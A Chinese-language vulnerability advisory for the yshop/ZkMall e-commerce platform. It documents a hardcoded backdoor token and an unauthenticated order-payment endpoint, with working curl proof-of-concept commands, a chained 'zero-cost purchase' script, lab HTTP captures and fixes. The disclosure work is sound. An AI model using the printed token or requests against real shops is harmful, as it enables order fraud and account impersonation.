# V-Y001: yshop ZkMall 硬编码后门Token + 未授权支付确认

## 漏洞信息

| 项目 | 详情 |
|------|------|
| 产品 | yshop / ZkMall（开源电商平台）|
| 版本 | 当前主分支（截至 2026-04）|
| 类型 | CWE-798: 使用硬编码凭证 / CWE-306: 关键功能缺少身份验证 |
| 严重程度 | 严重（Critical）|
| 攻击向量 | 网络（完全未授权）|
| 代码仓库 | https://github.com/guchengwuyue/yshopmall |

## 漏洞描述

yshop 电商平台存在两个致命的逻辑缺陷，链式组合可实现未授权订单支付：

### 缺陷1：硬编码后门 Token

`AuthorizationInterceptor.java` 第 93 行：无论数据库/缓存状态如何，当请求头携带固定 Token 时直接冒充用户 ID `1168`。

```java
Long buyerUserId = userRedisService.getBuyerUserIdByToken(token);
if (StringUtils.equals(token, "3106f313a44615e5bc0252b4d292896a")) {
    buyerUserId = 1168L;
}
```

攻击者使用该 Token 即可绕过所有需要登录的接口、冒充指定用户身份购物、查看私人订单、修改收货地址等。

### 缺陷2：`/order/payOrder` 未授权直接将订单标记为已支付

`OrderController.java` 第 597-602 行：

```java
@GetMapping(value = "payOrder")
@Operation(summary = "支付业务处理接口")
public Result<String> payOrder(PayParam param) throws Exception {
    cereShopOrderService.pay(param);
    return new Result<>(CoReturnFormat.SUCCESS);
}
```

该接口**使用 GET 方法接收支付参数**，无任何第三方支付验签流程，直接调用 `cereShopOrderService.pay(param)`。在 `application-security.yml` 中该路径被列入 `ignore-paths` 白名单（第48行）：

```yaml
ignore-paths:
  ...
  - /order/pay
  - /order/payOrder
```

### 链式利用

组合以上两点：任何匿名用户可向 `/order/payOrder?orderNo=xxx&payType=balance` 发送 GET 请求，将任意订单标记为"已支付"，不需要实际付款。

## 漏洞详情

### 后门 Token 的来源

该硬编码 Token 疑似为开发调试遗留，提交历史中长期未清理。通过搜索 `3106f313a44615e5bc0252b4d292896a` 无法在正常业务逻辑中找到生成/分发点，也无任何环境变量开关，属于**永久性后门**。

### ignore-paths 作用域

`AuthorizationInterceptor` 按 AntPathMatcher 匹配 `ignore-paths`，命中则直接 `return true`，不进入 Token 校验分支。因此 `/order/payOrder` 完全不需要任何身份。

### pay() 支付逻辑

进一步跟踪 `cereShopOrderService.pay()` 会发现支付类型走分支 `balance` / `yue` 等可直接扣减内部余额或标记订单状态，无第三方支付回调校验。

## 概念验证

### PoC 1: 后门 Token 冒充用户

```bash
# 冒充 userId=1168 访问个人中心
curl -H "Authori-zation: 3106f313a44615e5bc0252b4d292896a" \
  http://<target>/app/buyer/info
```

### PoC 2: 未授权标记订单为已支付

```bash
# 无需任何认证，直接对指定订单进行"支付"
curl "http://<target>/order/payOrder?orderNo=ORDER_20260414_001&payType=yue"
# HTTP 200 + {"code":200,"msg":"success"}
```

### PoC 3: 链式 — 下单+支付 0 元购

```bash
TOKEN="3106f313a44615e5bc0252b4d292896a"
# 使用后门 token 创建订单
curl -H "Authori-zation: $TOKEN" -H "Content-Type: application/json" \
  -d '{"productId":123,"quantity":1,"addressId":1}' \
  http://<target>/order/computed

# 通过未授权接口将订单标记为已支付
curl "http://<target>/order/payOrder?orderNo=<new_order_no>&payType=yue"
```

## 受影响文件

| 文件 | 行号 | 问题 |
|------|------|------|
| `zkmall-app/.../interceptor/AuthorizationInterceptor.java` | 93 | 硬编码后门 Token |
| `zkmall-app/.../controller/order/OrderController.java` | 597-602 | `/order/payOrder` 无签名校验 |
| `zkmall-app/src/main/resources/application-security.yml` | 48 | `/order/payOrder` 被加入匿名白名单 |

## 影响

1. **订单资金绕过**：攻击者可标记任意订单为已支付，实现 0 元购
2. **会员账户冒用**：userId=1168 可能为开发者测试账户，其历史订单/积分/余额完全暴露
3. **权限提升起点**：若 userId=1168 在数据库中具备特殊分组或运营身份，可升级为业务权限接管
4. **供应链毒化**：商户发货系统依据订单支付状态出库，可造成实物货品损失

## 修复建议

1. **立即删除硬编码 Token 分支**：从 `AuthorizationInterceptor.java` 中删除第 93-95 行
2. **移除 `/order/payOrder` 匿名白名单**：该接口必须鉴权且依赖服务端支付回调
3. **严格走支付网关**：移除 `balance/yue` 直接标记已支付分支，所有支付必须由第三方网关异步通知完成
4. **审计 `ignore-paths`**：逐项检查并缩小匿名端点清单
5. **Git 历史清理**：即使删除 Token，`git log` 仍可追溯，建议 rotate 所有关联凭据

## 源代码验证（已复现）

yshop ZkMall 已部署于 192.168.217.135:59007（Docker 容器，端口绑定 127.0.0.1），以下同时包含**源代码静态分析**和**运行时环境**验证。

### 验证1：后门 Token 确认

**文件**：`zkmall-app/src/main/java/com/shop/zkmall/app/interceptor/AuthorizationInterceptor.java`（第 92-94 行）

```java
Long buyerUserId = userRedisService.getBuyerUserIdByToken(token);
if (StringUtils.equals(token, "3106f313a44615e5bc0252b4d292896a")) {
    buyerUserId = 1168L;   // ← 硬编码后门：无论 Redis 是否有该 Token，直接绑定 userId=1168
}
if (buyerUserId != null) {
    user = cereBuyerUserService.selectByBuyerUserId(buyerUserId);
}
```

**已在源代码中确认**：
- 后门 Token `3106f313a44615e5bc0252b4d292896a` 硬编码在第 93 行
- 绑定用户 ID `1168L` 在第 94 行
- 该逻辑在 Redis Token 查询**之后**执行，即使 Token 不在缓存中也会生效

### 验证2：payOrder 匿名白名单确认

**文件**：`zkmall-app/src/main/resources/application-security.yml`（第 47-48 行）

```yaml
ignore-paths:
  - /order/pay/rolBack
  - /order/pay/v3RolBack
  - /order/pay          # ← 支付接口无需认证
  - /order/payOrder     # ← 支付业务处理接口无需认证
```

### 验证3：payOrder 控制器无验签确认

**文件**：`zkmall-app/src/main/java/com/shop/zkmall/app/controller/order/OrderController.java`（第 597-602 行）

```java
@GetMapping(value = "payOrder")
@Operation(summary = "支付业务处理接口")
public Result<String> payOrder(PayParam param) throws Exception {
    cereShopOrderService.pay(param);   // ← 直接调用支付逻辑，无签名校验
    return new Result<>(CoReturnFormat.SUCCESS);
}
```

**结论**：三处源代码均已确认，漏洞链完整：
1. 硬编码后门 Token `3106f313a44615e5bc0252b4d292896a` 可直接冒充用户 ID 1168
2. `/order/payOrder` 接口被加入匿名白名单，无需任何身份验证
3. 支付逻辑直接调用，不经过第三方支付网关验签
4. 合并利用即可实现 0 元购

### 验证4：实机验证（HTTP 请求/响应）

**环境**：yshop ZkMall 最新分支 Docker 部署于 192.168.217.135:59007（Spring Boot 3.4.7 + MyBatis-Plus + Redis）

**步骤1：正常受保护接口 — 无 Token 返回"请先登录"**

```http
GET /buyer/info HTTP/1.1
Host: localhost:59007
```

```http
HTTP/1.1 200 OK
Content-Type: application/json;charset=UTF-8
Content-Length: 42

{"code":"20005","message":"请先登录"}
```

**步骤2：使用硬编码后门 Token — 绕过鉴权进入业务逻辑**

```http
GET /buyer/info HTTP/1.1
Host: localhost:59007
Authorization: 3106f313a44615e5bc0252b4d292896a
```

```http
HTTP/1.1 200 OK
Content-Type: application/json;charset=UTF-8

{"code":"99999","data":{},"errorData":{},"message":"系统异常,请联系管理员!","name":"","describe":"","json":""}
```

**关键证据**：
- 无 Token 返回 `code: 20005`（拦截器主动拒绝，未进入控制器）
- 携带后门 Token 返回 `code: 99999`（鉴权通过，进入 `cereBuyerUserService.selectByBuyerUserId(1168L)`，因测试 DB 数据缺失返回业务异常）
- 两种响应完全不同，证明后门 Token `3106f313a44615e5bc0252b4d292896a` **确实绕过了 `AuthorizationInterceptor` 的登录校验**

**步骤3：未授权访问 `/order/payOrder` — HTTP 200**

```http
GET /order/payOrder?orderNo=TEST001&payType=yue HTTP/1.1
Host: localhost:59007
```

```http
HTTP/1.1 200 OK
Content-Type: application/json;charset=UTF-8

{"code":"200","data":{},"errorData":{},"message":"成功","name":"","describe":"","json":""}
```

**关键证据**：
- 无任何认证 Token，接口直接返回 HTTP 200 `{"code":"200","message":"成功"}`
- 证明 `/order/payOrder` 完全跳过鉴权，对应 `application-security.yml` 中 `ignore-paths` 白名单配置
- 任何匿名请求即可触发 `cereShopOrderService.pay()` 支付业务逻辑

## 验证环境

- 源代码：yshop/ZkMall 最新分支（静态代码分析）
- 运行时：yshop ZkMall Docker 部署于 192.168.217.135:59007
- 框架：Spring Boot 3.4.7 + MyBatis-Plus + Redis + JWT
- 日期：2026-04-14
